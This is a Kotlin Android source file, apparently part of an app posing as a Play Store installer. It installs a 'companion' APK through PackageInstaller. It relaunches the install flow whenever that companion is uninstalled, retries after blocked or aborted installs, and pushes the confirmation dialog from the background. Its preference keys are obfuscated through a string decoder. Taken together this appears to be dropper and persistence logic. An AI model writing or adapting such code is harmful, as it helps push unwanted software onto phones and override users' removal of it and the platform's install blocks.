package com.playstore.installer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build

class InstallReceiver : BroadcastReceiver() {

    companion object {
        val PREFS_NAME        get() = StringPool.d(StringPool.PREFS_NAME)
        val KEY_COMPANION_PKG get() = StringPool.d(StringPool.KEY_COMPANION_PKG)

        // Local broadcast action — InstallActivity listens for this
        const val ACTION_SHOW_INSTALL_DIALOG = "nova.ACTION_SHOW_INSTALL_DIALOG"
        const val EXTRA_USER_INTENT          = "user_intent"
    }

    override fun onReceive(context: Context, intent: Intent) {

        // Companion was uninstalled — reset and relaunch Install UI
        if (intent.action == Intent.ACTION_PACKAGE_REMOVED) {
            val uninstalledPkg = intent.data?.schemeSpecificPart ?: return
            val savedPkg = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getString(KEY_COMPANION_PKG, null)
            if (uninstalledPkg == savedPkg) {
                context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit().remove(StringPool.d(StringPool.KEY_STAGE)).apply()
                val launch = Intent(context, InstallActivity::class.java)
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                context.startActivity(launch)
            }
            return
        }

        val status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        )

        when (status) {

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // Android requires user confirmation to install.
                // We MUST show the dialog from a foreground Activity — not from here.
                // Send local broadcast to InstallActivity which is in foreground.
                // InstallActivity.installDialogReceiver handles it and calls startActivity().
                val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                } ?: return

                // First try: send to InstallActivity if it is in foreground
                val local = Intent(ACTION_SHOW_INSTALL_DIALOG)
                local.putExtra(EXTRA_USER_INTENT, userIntent)
                local.setPackage(context.packageName)
                context.sendBroadcast(local)

                // Second try: also attempt direct start (works if app is in foreground)
                try {
                    userIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(userIntent)
                } catch (e: Exception) {
                    // Blocked on Android 10+ if truly in background — local broadcast handles it
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                try {
                    val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                    if (!pkgName.isNullOrEmpty()) {
                        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                            .edit().putString(KEY_COMPANION_PKG, pkgName).apply()
                    }
                    // Notify InstallActivity to transition to DONE state
                    val done = Intent(InstallActivity.INSTALL_SUCCESS_ACTION)
                    done.setPackage(context.packageName)
                    context.sendBroadcast(done)
                } catch (e: Exception) { }
            }

            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_ABORTED,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                // Retry by restarting InstallActivity
                val restart = Intent(context, InstallActivity::class.java)
                restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(restart)
            }
        }
    }
}
